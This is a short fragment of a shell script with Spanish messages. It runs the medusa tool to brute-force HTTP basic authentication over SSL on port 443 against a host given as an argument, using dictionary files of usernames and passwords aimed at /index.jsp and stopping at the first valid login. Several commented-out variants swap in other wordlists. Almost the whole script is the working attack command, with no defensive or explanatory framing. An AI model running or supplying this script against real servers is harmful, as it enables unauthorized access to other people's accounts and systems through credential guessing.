...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a HTTP auth basic autenticacion basica por puerto 443/TCP."
...
echo
echo
medusa -h $1 -U usuarios0.txt -P claves0.txt -M http -m  /index.jsp -m METHOD:GET -m SSL -m PORT:443 -f
# medusa -h $1 -U usuarios.txt -P claves0.txt 
# medusa -h $1 -U usuarios.txt -P claves.txt 
# medusa -h $1S -U usuarios0.txt -P claves.txt 
# medusa -h $1 -U usuarios.txt -P claves.txt 
# medusa -h $1 -U usuarios.txt -P claves2.txt 
# medusa -h $1 -U usuarios0.txt -P claves2.txt 
echo
